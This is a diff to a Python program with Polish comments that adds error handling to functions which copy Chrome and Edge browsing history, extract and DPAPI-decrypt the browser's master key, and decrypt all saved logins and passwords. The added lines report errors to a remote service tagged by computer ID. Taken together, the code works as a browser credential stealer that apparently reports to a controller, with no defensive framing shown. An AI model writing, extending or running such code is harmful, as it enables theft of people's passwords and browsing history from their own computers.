@@ -474,34 +474,58 @@ def get_full_app_name(app_name_part):
 
 # Funkcja do pobierania historii przeglądarek (Edge/Chrome)
 def get_browser_history(browser="chrome", limit=10):
-    if browser == "edge":
-        history_db = os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\History')
-    else:  # Domyślnie Chrome
-        history_db = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\History')
+    try:
+        if browser == "edge":
+            history_db = os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default\History')
+        else:  # Domyślnie Chrome
+            history_db = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\History')
+
+        if not os.path.exists(history_db):
+            raise FileNotFoundError(f"❌ History file not found: {history_db}")
         
-    history_copy = history_db + "_copy"
-    shutil.copy2(history_db, history_copy)
-    conn = sqlite3.connect(history_copy)
-    cursor = conn.cursor()
-    cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
-    raw_history = cursor.fetchall()
-    conn.close()
-    os.remove(history_copy)
-    
-    history_list = [{"url": url, "title": title, "visits": visits} for url, title, visits in raw_history]
-    return history_list
+        history_copy = history_db + "_copy"
+        shutil.copy2(history_db, history_copy)
+
+        conn = sqlite3.connect(history_copy)
+        cursor = conn.cursor()
+
+        try:
+            cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
+        except sqlite3.DatabaseError as e:
+            raise RuntimeError(f"❌ SQLite error while fetching history: {e}")
+
+        raw_history = cursor.fetchall()
+        conn.close()
+        os.remove(history_copy)
+
+        history_list = [{"url": url, "title": title, "visits": visits} for url, title, visits in raw_history]
+        return history_list
+
+    except Exception as e:
+        print(f"❌ Error in get_browser_history: {e}")
+        return []
 
 # Funkcja do pobierania klucza szyfrującego dla przeglądarki (Edge/Chrome)
 def get_encryption_key(browser="chrome"):
-    if browser == "edge":
-        local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Local State")
-    else:  # Domyślnie Chrome
-        local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Local State")
-    
-    with open(local_state_path, "r", encoding="utf-8") as f:
-        local_state = json.load(f)
-    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]  # Usunięcie "DPAPI"
-    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    try:
+        if browser == "edge":
+            local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Local State")
+        else:  # Domyślnie Chrome
+            local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Local State")
+        
+        if not os.path.exists(local_state_path):
+            raise FileNotFoundError(f"❌ Local State file not found: {local_state_path}")
+
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]  # Usunięcie "DPAPI"
+        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+
+    except Exception as e:
+        print(f"❌ Error in get_encryption_key: {e}")
+        send_to_express(f"`❌` Error in get_encryption_key: \n ```{e}```", COMPUTER_ID)
+        return None
 
 # Funkcja do odszyfrowania hasła
 def decrypt_password(encrypted_password, key):
@@ -511,29 +535,56 @@ def decrypt_password(encrypted_password, key):
         cipher = AES.new(key, AES.MODE_GCM, iv)
         return cipher.decrypt(encrypted_password)[:-16].decode()
     except Exception as e:
+        print(f"❌ Error decrypting password: {e}")
+        send_to_express(f"`❌` Error decrypting password: \n ```{e}```", COMPUTER_ID)
         return ""
 
 # Funkcja do pobierania zapisanych haseł (Edge/Chrome)
 def get_browser_passwords(browser="chrome"):
-    if browser == "edge":
-        db_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Default\Login Data")
-    else:  # Domyślnie Chrome
-        db_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Login Data")
-    
-    temp_db = "LoginData.db"
-    shutil.copy2(db_path, temp_db)
-    conn = sqlite3.connect(temp_db)
-    cursor = conn.cursor()
-    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-    key = get_encryption_key(browser)
-    passwords = [{
-        "url": url,
-        "username": username,
-        "password": decrypt_password(password, key)
-    } for url, username, password in cursor.fetchall()]
-    conn.close()
-    os.remove(temp_db)
-    return passwords
+    try:
+        if browser == "edge":
+            db_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Microsoft\Edge\User Data\Default\Login Data")
+        else:  # Domyślnie Chrome
+            db_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Login Data")
+
+        if not os.path.exists(db_path):
+            raise FileNotFoundError(f"❌ Database file not found: {db_path}")
+
+        temp_db = "LoginData.db"
+        shutil.copy2(db_path, temp_db)
+
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+
+        try:
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        except sqlite3.DatabaseError as e:
+            raise RuntimeError(f"❌ SQLite error: {e}")
+
+        key = get_encryption_key(browser)
+
+        passwords = []
+        for url, username, password in cursor.fetchall():
+            try:
+                decrypted_password = decrypt_password(password, key)
+            except Exception as e:
+                decrypted_password = f"❌ Decryption failed: {e}"
+
+            passwords.append({
+                "url": url,
+                "username": username,
+                "password": decrypted_password
+            })
+
+        conn.close()
+        os.remove(temp_db)
+
+        return passwords
+
+    except Exception as e:
+        print(f"❌ Error in get_browser_passwords: {e}")
+        send_to_express(f"`❌` Error in get_browser_passwords: \n ```{e}```", COMPUTER_ID)
+        return []
 
 if __name__ == "__main__":
     asyncio.run(start())
